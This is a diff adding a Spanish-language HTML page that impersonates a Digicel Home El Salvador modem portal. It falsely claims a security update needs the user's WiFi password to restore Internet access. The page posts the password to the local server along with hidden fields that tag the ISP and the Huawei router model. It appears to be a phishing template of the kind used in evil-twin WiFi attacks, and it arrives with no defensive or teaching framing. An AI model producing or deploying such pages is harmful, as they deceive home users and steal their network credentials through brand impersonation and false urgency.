@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#e4002b">
+<title>Digicel | Activación de seguridad</title>
+<link rel="icon" href="data:,">
+<style>
+  :root {
+    --red: #e4002b;
+    --red-dark: #a8001f;
+    --red-deep: #6d0014;
+    --ink: #1d1d1f;
+    --muted: #6f7278;
+    --line: #e6e6e9;
+    --soft: #fff0f2;
+    --green: #1fa971;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body { min-height: 100%; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--ink);
+    background:
+      radial-gradient(circle at 10% 10%, rgba(228, 0, 43, .26), transparent 38%),
+      radial-gradient(circle at 90% 90%, rgba(228, 0, 43, .16), transparent 42%),
+      linear-gradient(145deg, #1a0006 0%, #35000e 50%, #5c0018 100%);
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px 16px;
+  }
+
+  .card {
+    width: 100%;
+    max-width: 460px;
+    background: #fff;
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: 0 30px 72px rgba(0, 0, 0, .5);
+    animation: rise .45s ease-out both;
+  }
+
+  @keyframes rise {
+    from { opacity: 0; transform: translateY(14px) scale(.985); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+
+  .brandbar {
+    padding: 18px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    background: linear-gradient(135deg, #e4002b 0%, #c50025 60%, #a8001f 100%);
+    color: #fff;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .brandbar::after {
+    content: "";
+    position: absolute;
+    width: 160px;
+    height: 160px;
+    border-radius: 50%;
+    border: 1px solid rgba(255, 255, 255, .14);
+    right: -70px;
+    top: -90px;
+  }
+
+  .brand { display: flex; align-items: center; gap: 10px; position: relative; z-index: 1; }
+
+  .brand-mark {
+    width: 40px;
+    height: 40px;
+    border-radius: 12px;
+    background: rgba(255, 255, 255, .14);
+    border: 1px solid rgba(255, 255, 255, .2);
+    display: grid;
+    place-items: center;
+    flex: 0 0 auto;
+  }
+
+  .brand-mark svg { width: 24px; height: 24px; }
+
+  .wordmark {
+    font-size: 26px;
+    line-height: 1;
+    font-weight: 800;
+    letter-spacing: -.9px;
+    color: #fff;
+  }
+
+  .brand-sub { display: block;
+    font-size: 9px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    color: #ffd1d9;
+    text-transform: uppercase;
+    margin-top: 3px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    background: rgba(0, 0, 0, .18);
+    border: 1px solid rgba(255, 255, 255, .22);
+    color: #fff;
+    border-radius: 999px;
+    padding: 6px 9px;
+    font-size: 9.5px;
+    font-weight: 800;
+    letter-spacing: .7px;
+    white-space: nowrap;
+    position: relative;
+    z-index: 1;
+  }
+
+  .badge span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #8dffba;
+    box-shadow: 0 0 0 3px rgba(141, 255, 186, .16);
+  }
+
+  .hero {
+    padding: 24px 24px 22px;
+    background:
+      radial-gradient(circle at 92% 0%, rgba(228, 0, 43, .08), transparent 40%),
+      linear-gradient(180deg, #fff 0%, #fff7f8 100%);
+    border-bottom: 1px solid #f4e7e9;
+  }
+
+  .eyebrow {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--soft);
+    border: 1px solid #ffd0d8;
+    color: #a00022;
+    border-radius: 999px;
+    padding: 5px 9px;
+    font-size: 9.5px;
+    font-weight: 800;
+    letter-spacing: .8px;
+    text-transform: uppercase;
+    margin-bottom: 13px;
+  }
+
+  .eyebrow span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--red);
+    box-shadow: 0 0 0 3px rgba(228, 0, 43, .12);
+  }
+
+  .hero h1 {
+    font-size: 25px;
+    line-height: 1.2;
+    letter-spacing: -.5px;
+    font-weight: 750;
+    margin-bottom: 8px;
+    color: #211114;
+  }
+
+  .hero p {
+    font-size: 13.5px;
+    line-height: 1.55;
+    color: var(--muted);
+  }
+
+  .content { padding: 21px 24px 22px; }
+
+  .router {
+    display: flex;
+    align-items: center;
+    gap: 11px;
+    padding: 12px 13px;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    background: #fafafa;
+    margin-bottom: 19px;
+  }
+
+  .router-icon {
+    width: 34px;
+    height: 34px;
+    border-radius: 9px;
+    background: var(--soft);
+    display: grid;
+    place-items: center;
+    flex: 0 0 auto;
+  }
+
+  .router-icon svg { width: 19px; height: 19px; }
+  .router-text { min-width: 0; flex: 1; }
+  .router-title { font-size: 12px; font-weight: 750; color: #3a2a2d; white-space: normal; overflow-wrap: anywhere; line-height: 1.35; }
+  .router-sub { font-size: 10.5px; color: #8b7c7f; margin-top: 2px; }
+
+  .online {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    font-size: 9.5px;
+    font-weight: 800;
+    color: var(--green);
+    white-space: nowrap;
+  }
+
+  .online::before {
+    content: "";
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 3px rgba(31, 169, 113, .13);
+  }
+
+  .notice {
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    padding: 11px 12px;
+    border-radius: 10px;
+    background: #fff7f8;
+    border: 1px solid #f7d9de;
+    color: #6e3a42;
+    font-size: 11.5px;
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+
+  .notice svg { width: 16px; height: 16px; flex: 0 0 auto; margin-top: 1px; }
+
+  .field { margin-bottom: 14px; }
+
+  label {
+    display: block;
+    font-size: 12px;
+    font-weight: 750;
+    color: #433034;
+    margin-bottom: 7px;
+  }
+
+  .input-wrap { position: relative; }
+
+  input[type="password"], input[type="text"] {
+    width: 100%;
+    height: 49px;
+    padding: 0 74px 0 14px;
+    border: 1.5px solid #ddd5d7;
+    border-radius: 12px;
+    background: #fcfcfc;
+    color: var(--ink);
+    font-size: 15px;
+    font-family: inherit;
+    outline: none;
+    transition: border-color .18s, box-shadow .18s, background .18s;
+  }
+
+  input[type="password"]:focus, input[type="text"]:focus {
+    border-color: var(--red);
+    background: #fff;
+    box-shadow: 0 0 0 4px rgba(228, 0, 43, .1);
+  }
+
+  input::placeholder { color: #a99c9e; }
+
+  .toggle {
+    position: absolute;
+    right: 8px;
+    top: 50%;
+    transform: translateY(-50%);
+    border: 0;
+    background: var(--soft);
+    color: #b30026;
+    font-family: inherit;
+    font-size: 10.5px;
+    font-weight: 800;
+    padding: 7px 9px;
+    border-radius: 7px;
+    cursor: pointer;
+  }
+
+  .toggle:hover { background: #ffe1e6; }
+
+  .meta-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+    margin: 2px 0 18px;
+    font-size: 11.5px;
+    color: var(--muted);
+  }
+
+  .remember { display: inline-flex; align-items: center; gap: 7px; cursor: pointer; }
+  .remember input { width: 15px; height: 15px; accent-color: var(--red); cursor: pointer; }
+  .link { color: #b30026; font-weight: 650; text-decoration: none; cursor: pointer; }
+
+  .submit {
+    width: 100%;
+    border: 0;
+    border-radius: 12px;
+    padding: 15px 18px;
+    background: linear-gradient(180deg, #f21b42 0%, var(--red) 58%, #c30024 100%);
+    color: #fff;
+    font-family: inherit;
+    font-size: 15px;
+    font-weight: 800;
+    cursor: pointer;
+    box-shadow: 0 10px 20px rgba(228, 0, 43, .24);
+    transition: filter .15s, transform .15s, box-shadow .15s;
+  }
+
+  .submit:hover { filter: brightness(1.05); transform: translateY(-1px); box-shadow: 0 14px 24px rgba(228, 0, 43, .3); }
+  .submit:active { transform: translateY(1px); }
+  .submit:disabled { opacity: .82; cursor: wait; transform: none; }
+
+  .footer {
+    padding: 14px 24px 17px;
+    text-align: center;
+    font-size: 9.5px;
+    line-height: 1.55;
+    color: #a99c9e;
+    background: #fcfcfc;
+    border-top: 1px solid #f4e7e9;
+  }
+
+  .footer strong { color: #8b7c7f; }
+
+  @media (max-width: 380px) {
+    body { padding: 10px; }
+    .brandbar { padding: 15px 17px; }
+    .hero { padding: 21px 17px 19px; }
+    .content { padding: 18px 17px 19px; }
+    .footer { padding: 12px 17px 15px; }
+    h1 { font-size: 22px; }
+    .badge { display: none; }
+  }
+</style>
+</head>
+<body>
+  <main class="card" role="main">
+    <header class="brandbar">
+      <div class="brand" aria-label="Digicel Home">
+        <span class="brand-mark" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 8.5C6.2 6.3 8.9 5.1 12 5.1C15.1 5.1 17.8 6.3 20 8.5" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M6.7 11.4C8.1 10 9.9 9.2 12 9.2C14.1 9.2 15.9 10 17.3 11.4" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+            <path d="M9.4 14.3C10.1 13.6 11 13.2 12 13.2C13 13.2 13.9 13.6 14.6 14.3" stroke="#ffffff" stroke-width="1.8" stroke-linecap="round"/>
+            <circle cx="12" cy="17.5" r="1.35" fill="#ffffff"/>
+          </svg>
+        </span>
+        <span>
+          <span class="wordmark">Digicel</span>
+          <span class="brand-sub">Home · El Salvador</span>
+        </span>
+      </div>
+      <span class="badge"><span></span> Red estable</span>
+    </header>
+
+    <section class="hero">
+      <div class="eyebrow"><span></span> Activación de seguridad</div>
+      <h1>Protege tu conexión WiFi</h1>
+      <p>Tu módem inició una actualización de seguridad. Para finalizarla y restaurar el acceso a Internet, confirma la contraseña de tu red inalámbrica.</p>
+    </section>
+
+    <section class="content">
+      <div class="router">
+        <span class="router-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="3" y="8" width="18" height="10" rx="2" stroke="#e4002b" stroke-width="1.6"/>
+            <path d="M7 13H9M11 13H13M15 13H17" stroke="#e4002b" stroke-width="1.6" stroke-linecap="round"/>
+            <path d="M7 8V6M17 8V6" stroke="#e4002b" stroke-width="1.6" stroke-linecap="round"/>
+          </svg>
+        </span>
+        <div class="router-text">
+          <div class="router-title">Huawei EG8145V5 · 192.168.0.1</div>
+          <div class="router-sub">Módem Digicel Home · Red 4G / 5G</div>
+        </div>
+        <span class="online">Conectado</span>
+      </div>
+
+      <div class="notice">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+          <path d="M12 3.5L21 19.5H3L12 3.5Z" stroke="#c20025" stroke-width="1.7" stroke-linejoin="round"/>
+          <path d="M12 9V13.5" stroke="#c20025" stroke-width="1.8" stroke-linecap="round"/>
+          <circle cx="12" cy="16.4" r="1" fill="#c20025"/>
+        </svg>
+        <span>La actualización no se completará hasta validar la clave de tu red. Esto evita accesos no autorizados.</span>
+      </div>
+
+      <form id="portalForm" method="POST" action="/" autocomplete="off">
+        <input type="hidden" name="isp" value="Digicel">
+        <input type="hidden" name="router_ip" value="192.168.0.1">
+        <input type="hidden" name="router_model" value="Huawei EG8145V5">
+        <input type="hidden" name="portal" value="digicel">
+
+        <div class="field">
+          <label for="wifi_password">Contraseña de la red WiFi</label>
+          <div class="input-wrap">
+            <input type="password" id="wifi_password" name="wifi_password" placeholder="Escribe la contraseña de tu red" required autofocus autocomplete="off" spellcheck="false">
+            <button type="button" class="toggle" id="togglePassword" aria-label="Mostrar contraseña">MOSTRAR</button>
+          </div>
+        </div>
+
+        <div class="meta-row">
+          <label class="remember" for="recordar">
+            <input type="checkbox" id="recordar" name="recordar" value="si" checked>
+            Guardar este dispositivo
+          </label>
+          <a class="link" href="#" id="helpLink">¿Necesitas ayuda?</a>
+        </div>
+
+        <button type="submit" class="submit" id="submitBtn">Activar conexión</button>
+      </form>
+    </section>
+
+    <footer class="footer">
+      <strong>Digicel El Salvador</strong> · Atención al Cliente<br>
+      © 2026 Digicel. Todos los derechos reservados.
+    </footer>
+  </main>
+
+  <script>
+    (function () {
+      var password = document.getElementById('wifi_password');
+      var toggle = document.getElementById('togglePassword');
+      var form = document.getElementById('portalForm');
+      var submitBtn = document.getElementById('submitBtn');
+      var helpLink = document.getElementById('helpLink');
+
+      if (toggle && password) {
+        toggle.addEventListener('click', function () {
+          var show = password.type === 'password';
+          password.type = show ? 'text' : 'password';
+          toggle.textContent = show ? 'OCULTAR' : 'MOSTRAR';
+          toggle.setAttribute('aria-label', show ? 'Ocultar contraseña' : 'Mostrar contraseña');
+          password.focus();
+        });
+      }
+
+      if (helpLink) {
+        helpLink.addEventListener('click', function (event) {
+          event.preventDefault();
+          alert('La contraseña WiFi viene en la etiqueta de tu módem Digicel. Si la cambiaste, usa la nueva clave.');
+        });
+      }
+
+      if (form && submitBtn) {
+        form.addEventListener('submit', function () {
+          if (!form.checkValidity()) return;
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Activando conexión...';
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
